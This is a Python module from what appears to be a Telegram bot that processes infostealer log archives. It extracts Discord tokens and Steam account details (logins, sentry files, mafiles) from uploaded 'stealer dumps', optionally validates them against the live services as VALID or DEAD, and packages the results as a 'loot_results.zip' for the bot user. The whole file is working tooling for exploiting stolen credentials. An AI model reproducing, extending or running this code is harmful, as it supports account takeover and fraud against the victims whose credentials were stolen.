"""
Loot extraction orchestrator.

Wraps the existing archive-unpacker (``services.extractor._extract_archive``)
with the loot scanners + validators (``services.loot``) and bundles the
results into a ``loot_results.zip`` payload that the bot can send back
to the user.

The on-disk layout of ``loot_results.zip`` is::

    loot_summary.txt
    discord_tokens.txt
    steam_accounts.txt

Empty sections are skipped so the user never receives a zip full of
zero-byte placeholder files.

What used to live here that no longer does:

* tdata extraction — produced too many false positives on real-world
  stealer dumps; the user explicitly asked for it to go.
* Saved-password (ULP / combo) dumping — ``/extract`` already does that
  through the ``/ulp`` and ``/combo`` modes. Having it inside ``/loot``
  too just made the result zip duplicate output.
"""

from __future__ import annotations

import asyncio
import os
import re
import shutil
import tempfile
import time
import zipfile
from dataclasses import dataclass, field
from typing import Iterable, List, Optional

from loguru import logger

import config
from services import loot as loot_mod
from services.extractor import (
    ExtractionProgress,
    ExtractionResult,
    _extract_archive,
)

# Telegram caps individual document uploads at 2 GB, but the bot also
# splits cookie outputs at config.OUTPUT_CHUNK_SIZE_BYTES (default
# 45 MB) to stay below the Bot API 50 MB safety limit. We piggy-back
# on the same knob for loot bundles.
_LOOT_BUNDLE_LIMIT = getattr(
    config, "OUTPUT_CHUNK_SIZE_BYTES", 45 * 1024 * 1024,
)

# Loot scan bucket identifiers — used by handlers to request a subset
# of the available scanners.
LOOT_ALL = "loot_all"
LOOT_DISCORD = "loot_discord"
LOOT_STEAM = "loot_steam"

ALL_LOOT_BUCKETS = frozenset({LOOT_DISCORD, LOOT_STEAM})


def _safe_label(value: str) -> str:
    """Sanitise *value* into something usable as a filename component."""
    cleaned = re.sub(r"[^A-Za-z0-9._+-]", "_", value.strip())
    return cleaned or "unknown"


def _render_discord_lines(tokens: Iterable[loot_mod.DiscordToken]) -> str:
    out: List[str] = []
    for tk in tokens:
        bits: List[str] = [tk.token]
        if tk.valid is True:
            bits.append("VALID")
            if tk.username:
                bits.append(f"user={tk.username}")
            if tk.user_id:
                bits.append(f"id={tk.user_id}")
            if tk.email:
                bits.append(f"email={tk.email}")
            if tk.phone:
                bits.append(f"phone={tk.phone}")
            if tk.mfa_enabled is True:
                bits.append("mfa=on")
            if tk.nitro and tk.nitro != "none":
                bits.append(f"nitro={tk.nitro}")
        elif tk.valid is False:
            bits.append("DEAD")
            if tk.error:
                bits.append(f"err={tk.error}")
        bits.append(f"src={tk.source_file}")
        out.append(" | ".join(bits))
    return "\n".join(out) + ("\n" if out else "")


def _render_steam_lines(accounts: Iterable[loot_mod.SteamAccount]) -> str:
    out: List[str] = []
    for acc in accounts:
        bits: List[str] = []
        if acc.account_name:
            bits.append(f"login={acc.account_name}")
        if acc.persona_name:
            bits.append(f"persona={acc.persona_name}")
        if acc.steam_id:
            bits.append(f"steamid={acc.steam_id}")
        if acc.remember_password is not None:
            bits.append(f"remember={'yes' if acc.remember_password else 'no'}")
        if acc.most_recent is not None:
            bits.append(f"recent={'yes' if acc.most_recent else 'no'}")
        if acc.timestamp:
            bits.append(f"ts={acc.timestamp}")
        if acc.ssfn_files:
            bits.append(f"sentry={len(acc.ssfn_files)}")
        if acc.mafile_path:
            bits.append("mafile=yes")
        if acc.valid is True:
            bits.append("VALID")
        elif acc.valid is False:
            bits.append("DEAD")
        if acc.profile_url:
            bits.append(acc.profile_url)
        if acc.error:
            bits.append(f"err={acc.error}")
        bits.append(f"src={acc.source_file}")
        out.append(" | ".join(bits))
    return "\n".join(out) + ("\n" if out else "")


def _render_summary(
    result: loot_mod.LootResult,
    *,
    archive_name: str,
    duration_s: float,
    validated: bool,
    buckets: "frozenset[str] | None" = None,
) -> str:
    live_discord = sum(1 for t in result.discord if t.valid is True)
    dead_discord = sum(1 for t in result.discord if t.valid is False)
    unknown_discord = sum(1 for t in result.discord if t.valid is None)
    live_steam = sum(1 for a in result.steam if a.valid is True)

    run_all = not buckets
    show_discord = run_all or (buckets and LOOT_DISCORD in buckets)
    show_steam = run_all or (buckets and LOOT_STEAM in buckets)

    lines = [
        "=== LOOT SUMMARY ===",
        f"Archive            : {archive_name}",
        f"Scan duration      : {duration_s:.1f} s",
        f"Validation         : {'on' if validated else 'off'}",
        "",
    ]
    if show_discord:
        if validated:
            lines.append(
                f"Discord tokens     : {len(result.discord)} "
                f"({live_discord} live, {dead_discord} dead, "
                f"{unknown_discord} unknown)"
            )
        else:
            lines.append(f"Discord tokens     : {len(result.discord)}")
    if show_steam:
        if validated:
            lines.append(
                f"Steam accounts     : {len(result.steam)} "
                f"({live_steam} live)"
            )
        else:
            lines.append(f"Steam accounts     : {len(result.steam)}")
    if result.errors:
        lines.append("")
        lines.append("=== ERRORS ===")
        lines.extend(result.errors)
    return "\n".join(lines) + "\n"


@dataclass
class LootExtractionConfig:
    """Knobs controlling :func:`run_loot_extraction_async`."""

    target_domains: List[str] = field(default_factory=list)
    validate: bool = False
    validate_discord: bool = True
    validate_steam: bool = True
    # When non-empty, only the listed buckets are scanned. When empty
    # (the default), ALL buckets run.
    buckets: frozenset[str] = field(default_factory=frozenset)


def _bundle_loot_dir(loot_out_dir: str, dest_zip: str) -> None:
    """Zip the staged loot output directory into a single deliverable."""
    with zipfile.ZipFile(
        dest_zip, "w",
        compression=zipfile.ZIP_DEFLATED,
        compresslevel=6,
    ) as zf:
        for dirpath, _dirs, files in os.walk(loot_out_dir):
            for name in files:
                full = os.path.join(dirpath, name)
                rel = os.path.relpath(full, loot_out_dir)
                zf.write(full, arcname=rel)


def _split_loot_zip(zip_path: str, output_dir: str) -> List[str]:
    """If *zip_path* is larger than the bot's per-message size limit
    keep it as-is (Telegram is fine up to 2 GB via Pyrogram); we never
    split a single archive because doing so corrupts the contained zip
    layout. Returns ``[zip_path]`` for symmetry with the cookie flow."""
    if not os.path.exists(zip_path) or os.path.getsize(zip_path) == 0:
        return []
    return [zip_path]


def _write_text(path: str, text: str) -> None:
    if not text:
        return
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", encoding="utf-8") as fh:
        fh.write(text)


def _stage_outputs(
    result: loot_mod.LootResult,
    loot_out_dir: str,
    archive_name: str,
    duration_s: float,
    settings: LootExtractionConfig,
) -> None:
    """Materialise the loot result into ``loot_out_dir``.

    Empty buckets produce no files — the user never receives a zip
    full of zero-byte placeholders.
    """
    # summary
    summary = _render_summary(
        result,
        archive_name=archive_name,
        duration_s=duration_s,
        validated=settings.validate,
        buckets=settings.buckets,
    )
    _write_text(os.path.join(loot_out_dir, "loot_summary.txt"), summary)

    # tokens
    if result.discord:
        discord_text = _render_discord_lines(result.discord)
        _write_text(
            os.path.join(loot_out_dir, "discord_tokens.txt"), discord_text,
        )

    if result.steam:
        steam_text = _render_steam_lines(result.steam)
        _write_text(
            os.path.join(loot_out_dir, "steam_accounts.txt"), steam_text,
        )


def _run_loot_extraction(
    archive_path: str,
    progress: ExtractionProgress,
    settings: LootExtractionConfig,
    *,
    password: Optional[str] = None,
) -> tuple[ExtractionResult, loot_mod.LootResult]:
    """Blocking implementation — meant to be wrapped in
    ``asyncio.to_thread``."""
    start = time.monotonic()
    temp_dir = tempfile.mkdtemp(dir=str(config.TEMP_DIR), prefix="loot_in_")
    output_dir = tempfile.mkdtemp(dir=str(config.TEMP_DIR), prefix="loot_out_")
    loot_stage = os.path.join(output_dir, "_stage")
    os.makedirs(loot_stage, exist_ok=True)

    try:
        progress.phase = "extracting"
        progress.extract_start = time.monotonic()
        progress.current_file = ""
        _extract_archive(archive_path, temp_dir, progress, password=password)
        if progress.cancelled:
            return (
                ExtractionResult(
                    success=False,
                    error="Cancelled by user before any files were scanned",
                    duration_seconds=time.monotonic() - start,
                    partial=True,
                ),
                loot_mod.LootResult(),
            )

        progress.phase = "scanning"
        # Reset dashboard state for this scan so a previous /loot run
        # doesn't bleed counters into the live message.
        progress.loot_bucket = ""
        progress.loot_counts = {}
        progress.loot_valid_counts = {}
        progress.loot_validate_total = 0
        progress.loot_validate_done = 0
        result = loot_mod.scan_directory_for_loot(
            temp_dir,
            buckets=settings.buckets or None,
            progress=progress,
        )
        progress.files_scanned = result.scanned_files or 0

        # Network validation runs in the same thread via asyncio.run
        # because the rest of the loot pipeline is synchronous. The
        # async wrapper above bypasses this when validate is disabled.
        if settings.validate and (result.discord or result.steam):
            progress.phase = "validating"
            try:
                asyncio.run(
                    loot_mod.validate_loot_async(
                        result,
                        validate_discord=settings.validate_discord,
                        validate_steam=settings.validate_steam,
                        progress=progress,
                    )
                )
            except Exception:
                logger.exception("Loot validation failed")

        progress.phase = "packaging"
        _stage_outputs(
            result, loot_stage,
            archive_name=os.path.basename(archive_path),
            duration_s=time.monotonic() - start,
            settings=settings,
        )

        bundle = os.path.join(output_dir, "loot_results.zip")
        _bundle_loot_dir(loot_stage, bundle)
        outputs = _split_loot_zip(bundle, output_dir)

        progress.phase = "done"
        return (
            ExtractionResult(
                success=bool(outputs),
                output_files=outputs,
                files_scanned=progress.files_scanned,
                duration_seconds=time.monotonic() - start,
            ),
            result,
        )
    except Exception as exc:
        logger.exception("Loot extraction failed")
        progress.phase = "failed"
        return (
            ExtractionResult(
                success=False,
                error=str(exc),
                duration_seconds=time.monotonic() - start,
            ),
            loot_mod.LootResult(),
        )
    finally:
        shutil.rmtree(temp_dir, ignore_errors=True)
        # output_dir + bundle are cleaned up by the caller after
        # uploading the result file.


async def run_loot_extraction_async(
    archive_path: str,
    progress: ExtractionProgress,
    settings: Optional[LootExtractionConfig] = None,
    *,
    password: Optional[str] = None,
) -> tuple[ExtractionResult, loot_mod.LootResult]:
    """Async facade around :func:`_run_loot_extraction`.

    Always returns ``(ExtractionResult, LootResult)``; callers will
    typically only need the first to forward results to the user but
    the raw ``LootResult`` is useful for the per-job status message.
    """
    return await asyncio.to_thread(
        _run_loot_extraction,
        archive_path,
        progress,
        settings or LootExtractionConfig(),
        password=password,
    )
